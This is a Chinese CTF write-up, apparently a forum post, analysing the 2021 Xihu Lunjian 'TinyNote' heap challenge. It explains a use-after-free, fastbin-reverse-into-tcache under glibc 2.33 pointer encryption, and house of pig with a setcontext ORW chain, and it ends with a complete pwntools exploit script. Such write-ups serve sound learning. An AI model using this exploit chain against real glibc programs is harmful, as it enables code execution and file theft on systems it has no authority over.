
# 2021年西湖论剑TinyNote详细分析

## 一.前言

初学house of pig，查看了几个有关分析TinyNote的文章，感觉具体讲述的exp并不是很详细，本篇文章希望通过详细的解释，更好的理解如何利用fastbin reverse into tcache来实现house of pig最终实现orw读取flag

## 二.前置知识

对于TinyNote的利用主要是需要掌握libc 2.32以后对于fastbin reverse into tcache的应用，以及对于house of pig的利用。这里简单阐述一下对应的利用方式在本篇文章需要注意的地方。

### 2.1 fastbin reverse into tcache

对于libc 2.32的fastbin reverse into tcache和之前变化的主要区别在于，tcache的fd已经进行了加密的操作，通过chunk的地址>>12去和fd值异或来实现对于fd进行加密，因此为了实现任意地址写一个堆地址，我们需要考虑到加密的因素。

### 2.2 house of pig

相比较于同名题目house of pig，这个题目需要利用的house of pig进行了沙盒过滤，因此我们只能利用orw进行读取flag，并且利用了新版本的setcontext + 61来实现srop，并且利用了pcop这个gadget，具体的内容如下：

```asm
mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
```

## 三.TinyNote的脚本解析

### 3.1 漏洞分析

对于TinyNote这个题目首先查看一下他的题目代码，功能十分简单：

![image-20231216213058992](https://bbs.kanxue.com/./upload/attach/202312/991890_8RADCBVP2WQHBC5.png)

只有`add`, `edit`, `show`, `delete`四个功能，并且存在的漏洞也十分简单。

对于`add`，他是固定了只能分配`0x20`大小的一个chunk，并且需要通过检查实现和堆开始的地址存储在同一个页中，但是list只能存储三个chunk的地址。

![image-20231216213234947](https://bbs.kanxue.com/./upload/attach/202312/991890_MX56VWEZQ5ZDKQK.png)

对于`edit`和`show`为正常的功能，也限制了`edit`的大小。

![image-20231216213317974](https://bbs.kanxue.com/./upload/attach/202312/991890_YDR5QFXW7ZBQP3X.png)

对于`delete`也是存在uaf，由于所有的功能里面都没有对于list进行检查，所以可以任意利用uaf漏洞来进行利用。

![image-20231216213331958](https://bbs.kanxue.com/./upload/attach/202312/991890_ZGZ6BC8RUCAAZER.png)

### 3.2 漏洞利用

#### 3.2.1 获取heap的基地址

通过上述对于题目的代码分析我们可以知道因为这个题可以随意利用uaf漏洞，所以我们可以很轻易的获取到堆的初始地址：

```python
add(0)
add(1)
delete(0)
show(0)
io.recvuntil(b'Content:')
heap_base = u64(io.recv(5).ljust(8, b'\x00')) << 12
```

这里只需要申请一个`0x20`大小的chunk并且将其free掉，由于对于fd进行了加密，所以当前fd中存储的其实就是当前chunk的地址左移12位的结果，我们只需要恢复右移12位即可，这样就可以获得对应的heap的基地址

#### 3.2.2 获取libc的基地址

对于该题限制了对于malloc的大小，所以我们如果需要泄露libc的基地址，就需要通过构造，形成一个unsorted bin的一个chunk，由于show函数没有检查是否chunk被删除，导致可以获得libc的基地址：

```python
heap = heap_base + 0x2b0
xor = heap_base >> 12
delete(1)
edit(1, p64(xor ^ heap))
add(1)
add(0)
edit(0, p64(0) + p64(0x421))
for i in range(33):
    add(0)
delete(1)
show(1)
io.recvuntil(b'Content:')
libcbase = u64(io.recv(6).ljust(8, b'\x00')) - (0x7f71d9fd2c00 - 0x7f71d9df2000)
```

这里其实就是利用了tcache在get时检查的缺陷，我们首先通过对于fd的加密，将之前分配好的chunk1的fd指向chunk1的size域，这样就可以修改对应的size位`0x421`，之后free就可以将其放入到unsorted bin中，并且泄露出libc的地址，但是需要注意的是，由于需要让top chunk在`0x420`的chunk以下，所以需要分配33个`0x20`大小的chunk，否则就会导致程序报错

删除之后对chunk1进行删除并且泄露对应的libc基地址

![image-20231216215050144](https://bbs.kanxue.com/./upload/attach/202312/991890_6SWZ9WRJXJ4SCMZ.png)

#### 3.2.3 通过fastbin reverse into tcache来实现修改stderr的chain域

由于本题的stderr并没有在bss段上，所以没办法像house of pig那样直接进行修改，所以这里主要是利用了fastbin reverse into tcache，将chain域进行修改，让他指向可控制的chunk上，在这个可控制的地方伪造file的结构，最终实现house of pig的攻击。

对于第一段代码，他的主要作用是将`list[0]`中存储`heap_base + 0x10`这个指针，方便之后通过这里这个指针修改tcache bin结构中指向`0x20`大小的chunk的个数。

```python
add(0)
add(1)
delete(0)
delete(1)
heap = heap_base + 0x10
edit(1, p64(xor ^ heap))
add(0)
add(0)
#edit(0, p64(0))
```

对于第二段代码主要是填满tcache中的chunk，修改了chunk1中fd指向，让他指向`heap_base + 0x90`，这里的作用是使得tcache bin中的结构链表被`list[1]`进行控制，之后利用循环不断的进行添加，添加七个tcache的bin

```python
add(1)
add(2)
delete(1)
edit(0, p64(2))
edit(1, p64(xor ^ heap_base + 0x90))
add(1)
add(1)
for i in range(7):
    edit(0, p64(0))
    add(2)
    edit(0, p64(i))
    delete(2)
```

执行完代码最终的效果如下：

#### 3.2.4 最终效果验证

![image-20231217100603332](./upload/attach/202312/991890_TNF3P56T2BE6QF8.png)

![image-20231217100707103](./upload/attach/202312/991890_4ES7Z6BAET5N3A7.png)

这里可以看到和预期中的一样，要`malloc`一个`0x230` size的一个chunk，并且观察tcache bin中有对应的chunk，之后继续步入，看一下`memcpy`的部分。

![image-20231217100826916](./upload/attach/202312/991890_YPWVTT3HGH6CVHX.png)

![image-20231217100904845](./upload/attach/202312/991890_NF3BPCHWRSUGUF4.png)

这里也可以成功看到已经将`__free_hook`的内容覆盖为`pcop`的地址了，之后就是进行`free`函数的调用，并且进入到`pcop`的gadget

![image-20231217101259403](./upload/attach/202312/991890_7X4KBGG5UDDAFYE.png)

这里可以看见已经进入到了`pcop`的gadget并且进行了赋值，最终`call`的地址也如我们预想中的一样为`setcontext + 61`，通过一系列的赋值操作，我们观察栈中的数据可以看到，已经布局为orw所需要的gadget的片段了。

![image-20231217101511129](./upload/attach/202312/991890_6SQ4F6VZFBPKJWB.png)

![image-20231217101529988](./upload/attach/202312/991890_KREHCSFPJW5DEAA.png)

之后就是进行一系列的调用，最终就可以实现读出我们需要的flag内容，并且`ret`之后就开始执行这些gadget。

#### 3.2.5 完整的exp

```python
from pwn import *
io = process("./TinyNote")
libc = ELF("./libc-2.33.so")
def add(idx):
    io.recvuntil(b'Choice:')
    io.sendline(b'1')
    io.recvuntil(b'Index:')
    io.sendline(str(idx).encode())
def edit(idx, content):
    io.recvuntil(b'Choice:')
    io.sendline(b'2')
    io.recvuntil(b'Index:')
    io.sendline(str(idx).encode())
    io.recvuntil(b'Content:')
    io.send(content)
def show(idx):
    io.recvuntil(b'Choice:')
    io.sendline(b'3')
    io.recvuntil(b'Index:')
    io.sendline(str(idx).encode())
def delete(idx):
    io.recvuntil(b'Choice:')
    io.sendline(b'4')
    io.recvuntil(b'Index:')
    io.sendline(str(idx).encode())
add(0)
add(1)
delete(0)
show(0)
io.recvuntil(b'Content:')
heap_base = u64(io.recv(5).ljust(8, b'\x00')) << 12
heap = heap_base + 0x2b0
xor = heap_base >> 12
delete(1)
edit(1, p64(xor ^ heap))
add(1)
add(0)
edit(0, p64(0) + p64(0x421))
for i in range(33):
    add(0)
delete(1)
show(1)
io.recvuntil(b'Content:')
libcbase = u64(io.recv(6).ljust(8, b'\x00')) - (0x7f71d9fd2c00 - 0x7f71d9df2000)
io_list_all = libcbase + 0x1e15c0
io_str_jumps = libcbase + (0x7f6b247b0560 - 0x7f6b245ce000)
free_hook = libcbase + libc.sym['__free_hook']
pcop = libcbase + 0x14a0a0
setcontext = libcbase + libc.sym['setcontext']
rdi_ret = libcbase + 0x000000000028a55
rsi_ret = libcbase + 0x00000000002a4cf
rdx_ret = libcbase + 0x0000000000c7f32
open = libcbase + libc.sym['open']
read = libcbase + libc.sym['read']
write = libcbase + libc.sym['write']
add(0)
add(1)
delete(0)
delete(1)
heap = heap_base + 0x10
edit(1, p64(xor ^ heap))
add(0)
add(0)
#edit(0, p64(0))
add(1)
add(2)
delete(1)
edit(0, p64(2))
edit(1, p64(xor ^ heap_base + 0x90))
add(1)
add(1)
for i in range(7):
    edit(0, p64(0))
    add(2)
    edit(0, p64(i))
    delete(2)
edit(0, p64(0))
add(2)
edit(0, p64(7))
delete(2)
edit(2, p64(xor ^ (io_list_all + 0x70)))
for i in range(6):
    add(2)
    edit(0, p64(7))
    delete(2)
    edit(0, p64(6-i))
edit(0, p64(0))
#edit(1, p64(io_list_all >> 12))
add(2)
def change(addr,context):
    edit(0,p64(1))
    edit(1,p64(addr))
    add(2)
    edit(2,context)
length=0x230
start = heap_base + 0x600
end = start + ((length) - 100)//2
change(heap_base + 0x30,p64(1)+p64(0xffffffffffff))
change(heap_base + 0x40,p64(0)+p64(start))
change(heap_base + 0x50,p64(end))
change(heap_base + 0xc0,p64(0))
change(heap_base + 0xe0,p64(0)+p64(io_str_jumps))
change(heap_base + 0x1a0,p64(free_hook))
change(start,p64(pcop)+p64(heap_base + 0x700))
change(heap_base + 0x720,p64(setcontext+61))
change(heap_base + 0x7a0,p64(heap_base + 0x800)+p64(rdi_ret))
change(heap_base + 0x7c0,'flag'.ljust(0x10,'\x00'))
change(heap_base + 0x800,p64(heap_base + 0x7c0)+p64(rsi_ret))
change(heap_base + 0x810,p64(0)+p64(open))
change(heap_base + 0x820,p64(rdi_ret)+p64(3))
change(heap_base + 0x830,p64(rsi_ret)+p64(heap_base + 0x900))
change(heap_base + 0x840,p64(rdx_ret)+p64(0x50))
change(heap_base + 0x850,p64(read)+p64(rdi_ret))
change(heap_base + 0x860,p64(1)+p64(write))
edit(1,p64(free_hook))
edit(0,p64(1))
add(2)
io.interactive()
```

## 四.总结

自此就完成了对于整个TinyNote的复现，通过这个题目可以很好的认识到house of pig的利用原理，并且掌握对于orw版的house of pig如何进行构造，对于题解中的file构造以及后面劫持程序执行流的构造都十分巧妙。通过这部分的理解，使得我可以更加清晰的认识到对于新版本的libc下的一些高级利用手法。
